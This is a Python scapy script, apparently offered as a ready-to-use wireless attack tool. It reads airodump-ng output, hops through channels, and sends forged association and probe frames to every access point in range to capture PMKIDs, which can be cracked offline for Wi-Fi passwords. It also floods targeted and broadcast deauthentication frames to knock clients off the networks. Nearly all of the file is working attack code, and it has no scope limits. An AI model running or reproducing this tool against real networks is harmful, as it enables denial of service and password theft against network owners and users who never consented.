import threading, argparse, time, os, random, subprocess, re, signal, csv
from collections import defaultdict
from scapy.all import *
from scapy.layers.dot11 import (
    Dot11Beacon, Dot11Elt, Dot11ProbeResp, Dot11,
    Dot11Auth, Dot11AssoReq, Dot11Deauth, RadioTap,
    Dot11ProbeReq, Dot11AssoResp, Dot11Disas
)
from colorama import init, Fore, Style
init()


def log(msg, color=Fore.WHITE):
    print(f"{color}[{time.strftime('%H:%M:%S')}] {Style.RESET_ALL}{msg}")

sta_mac = "02:00:00:9e:1c:69"
scanning_enabled = True
lock = threading.Lock()

attack_status = defaultdict(lambda: {
    "pmkid_sent": 0,
    "deauth_bcast_sent": 0,
    "clients_deauthed": set()
})
aps = {}
clients = defaultdict(dict)


def handle_exit(sig, frame):
    log("Script terminated.", Fore.RED)
    os._exit(0)

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)


def build_rsn_ie(pmkid: bytes | None = None) -> bytes:
    pmkid = pmkid or b"\x00" * 16
    rsn  = b"\x01\x00"
    rsn += b"\x00\x0f\xac\x04"
    rsn += b"\x01\x00"
    rsn += b"\x00\x0f\xac\x04"
    rsn += b"\x01\x00"
    rsn += b"\x00\x0f\xac\x02"
    rsn += b"\x00\x00"
    rsn += b"\x01\x00"
    rsn += pmkid
    return rsn

def build_mobility_domain_ie(mdid: bytes = b"\x12\x34", ft_cap: int = 0x0100) -> Dot11Elt:
    return Dot11Elt(ID=54, info=mdid + ft_cap.to_bytes(2, "little"))


def send_frame(pkt: Packet, iface: str, count: int = 3, inter: float = 0.1, label: str | None = None):
    sendp(pkt, iface=iface, count=count, inter=inter, verbose=False)
    if label:
        log(f"{label} sent ({count}x)", Fore.YELLOW)
    time.sleep(0.15)   


def attack_all_variants(bssid: str, essid: str, iface: str):
    if attack_status[bssid]["pmkid_sent"] >= 1:
        return

    rsn_ie = Dot11Elt(ID=48, info=build_rsn_ie())
    md_ie  = build_mobility_domain_ie()
    ssid_ie = Dot11Elt(ID="SSID", info=essid)
    rates   = Dot11Elt(ID="Rates", info=b"\x02\x04\x0b\x16\x0c\x12\x18\x24")

    auth = RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2=sta_mac, addr3=bssid) / Dot11Auth(algo=0, seqnum=1, status=0)
    assoc = RadioTap() / Dot11(type=0, subtype=0, addr1=bssid, addr2=sta_mac, addr3=bssid) / Dot11AssoReq(cap=0x1100, listen_interval=0x00a) / ssid_ie / rates / rsn_ie
    assoc_ft = RadioTap() / Dot11(type=0, subtype=0, addr1=bssid, addr2=sta_mac, addr3=bssid) / Dot11AssoReq(cap=0x1100, listen_interval=0x00a) / ssid_ie / rates / md_ie / rsn_ie
    probe = RadioTap() / Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=sta_mac, addr3="ff:ff:ff:ff:ff:ff") / Dot11ProbeReq() / ssid_ie / rates / rsn_ie

    send_frame(auth, iface)
    send_frame(assoc, iface, label=f"Assoc PMKID {essid} - {bssid}")
    send_frame(assoc_ft, iface, label=f"Assoc FT PMKID {essid} - {bssid}")
    send_frame(probe, iface, label=f"Probe PMKID {essid} - {bssid}")

    attack_status[bssid]["pmkid_sent"] += 1


def perform_attack(bssid: str, essid: str, client_set: set, iface: str):
    try:
        attack_all_variants(bssid, essid, iface)

        for sta in client_set:
            if sta not in attack_status[bssid]["clients_deauthed"]:
                d1 = RadioTap() / Dot11(addr1=sta, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                d2 = RadioTap() / Dot11(addr1=bssid, addr2=sta, addr3=bssid) / Dot11Deauth(reason=7)
                sendp([d1, d2], iface=iface, inter=0.15, count=5, verbose=False)
                attack_status[bssid]["clients_deauthed"].add(sta)
                time.sleep(random.uniform(0.5, 1.5))

        if attack_status[bssid]["deauth_bcast_sent"] < 1:
            broadcast = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid
            ) / Dot11Deauth(reason=7)
            sendp(broadcast, iface=iface, count=5, inter=0.15, verbose=False)
            attack_status[bssid]["deauth_bcast_sent"] += 1

    except OSError as e:
        if "Network is down" in str(e):
            log("Network interface unavailable. Exiting.", Fore.RED)
            os._exit(1)
        else:
            log(f"OS Error: {e}", Fore.RED)
            os._exit(1)
    except Exception as e:
        log(f"Attack error on {bssid}: {e}", Fore.RED)


def attack_loop_with_hopping(interface: str):
    already_attacked = set()

    while True:
        aps, clients_map, channel_list = parse_airodump_csv()
        for ch in channel_list:
            set_channel(interface, ch)
            log(f"Channel {ch} — analyzing APs", Fore.BLUE)

            for bssid, ap_data in aps.items():
                if ap_data["channel"] != ch:
                    continue
                if bssid in already_attacked:
                    continue
                essid = ap_data["essid"]
                client_set = clients_map.get(bssid, set())
                set_channel(interface, ch)
                log(f"⟶ Attacking AP {essid} ({bssid}) with {len(client_set)} client(s)", Fore.MAGENTA)
                perform_attack(bssid, essid, client_set, interface)
                already_attacked.add(bssid)
                time.sleep(random.uniform(0.4, 0.8)) # Cooldown card

            log(f"⟳ End of channel {ch}, hopping to next...", Fore.GREEN)
            time.sleep(random.uniform(1.8, 2.5)) # Cooldown card


def set_channel(interface: str, channel: int):
    try:
        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)],
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       check=True)
        log(f"Switched to channel {channel}", Fore.CYAN)
    except subprocess.CalledProcessError:
        log(f"Failed to switch to channel {channel}", Fore.RED)
    except OSError as e:
        if "Network is down" in str(e):
            log("Network interface unavailable. Exiting.", Fore.RED)
            os._exit(1)
        else:
            log(f"Error: {e}", Fore.RED)
            os._exit(1)
    except Exception as e:
        log(f"Unknown error: {e}", Fore.RED)


def parse_airodump_csv(path="/tmp/output-01.csv"):
    ap_section = True
    aps = {}
    clients = defaultdict(set)
    current_channel_map = {}

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()

    reader = csv.reader(lines)
    headers_seen = 0

    for row in reader:
        # Skip empty lines
        if not row or all(not cell.strip() for cell in row):
            continue

        # Switch between AP and Station section
        if "Station MAC" in row[0]:
            ap_section = False
            continue

        if ap_section:
            if len(row) < 14 or not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", row[0]):
                continue
            bssid = row[0].strip()
            essid = row[13].strip()
            try:
                channel = int(row[3].strip())
            except ValueError:
                continue
            if essid:
                aps[bssid] = {"essid": essid, "channel": channel}
                current_channel_map[channel] = current_channel_map.get(channel, set())
                current_channel_map[channel].add(bssid)
        else:
            if len(row) < 6:
                continue
            station = row[0].strip()
            bssid = row[5].strip()
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                clients[bssid].add(station)

    return aps, clients, sorted(current_channel_map.keys())


def get_channel_list(args):
    if args.channel:
        return [int(ch) for ch in args.channel.split(",")]
    band_channels = {
        "a": list(range(36, 165, 4)),  # 5GHz common channels
        "b": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11],  # 2.4GHz
        "g": [1, 6, 11],  # commonly used in 2.4GHz
        "abg": [1, 6, 11] + list(range(36, 165, 4))
    }
    return band_channels.get(args.band, [1, 6, 11])  # default fallback


def channel_scan_loop(interface: str, channels: list[int], rounds: int, dwell_time: float, cswitch: int):
    log(f"[+] Starting scan over {len(channels)} channel(s), {rounds} round(s)", Fore.YELLOW)
    
    if cswitch == 1:  # Round Robin
        random.shuffle(channels)
    
    for r in range(rounds):
        log(f"[!] Round {r+1}/{rounds}", Fore.MAGENTA)
        ch_list = channels.copy()
        
        if cswitch == 1:
            random.shuffle(ch_list)
        elif cswitch == 2:
            ch_list = [ch_list[-1]] + ch_list[:-1]
        
        for ch in ch_list:
            set_channel(interface, ch)
            log(f"⏳ Listening on channel {ch} ({dwell_time:.1f}s)", Fore.CYAN)
            time.sleep(dwell_time)

    log("✅ Channel scan completed", Fore.GREEN)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PMKID and Deauth attacks by channel from CSV")
    parser.add_argument("-i", "--interface", required=True, help="Monitor mode interface")
    parser.add_argument("-c", "--channel", default="1,6,11", help="List of channels to scan (default 1,6,11)")
    parser.add_argument("-b", "--band", choices=["a", "b", "g", "abg"], help="Scan band")
    parser.add_argument("--cswitch", type=int, choices=[0,1,2], default=0, help="Canal switch methods (0: FIFO, 1: Round Robin, 2: Hop on last). FIFO by default")
    parser.add_argument("--scan-rounds", type=int, default=3, help="Number of scan cycles to perform (default: 3 rounds)")
    parser.add_argument("--dwell-time", type=float, default=3.0, help="Time (in seconds) to stay on each channel (default: 3s)")
    args = parser.parse_args()

    iface = args.interface

    channel_list = get_channel_list(args)
    
    channel_scan_loop(
        interface=iface,
        channels=channel_list,
        rounds=args.scan_rounds,
        dwell_time=args.dwell_time,
        cswitch=args.cswitch
    )

    attack_loop_with_hopping(iface)
